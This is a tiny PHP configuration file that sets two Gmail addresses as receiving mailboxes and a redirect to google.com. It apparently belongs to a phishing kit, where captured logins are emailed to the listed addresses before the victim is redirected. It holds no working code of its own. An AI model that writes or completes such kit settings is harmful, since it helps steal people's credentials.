<?php 
$Receive_email="httpstools@gmail.com,astronix880@gmail.com";
$redirect="https://www.google.com/";
?>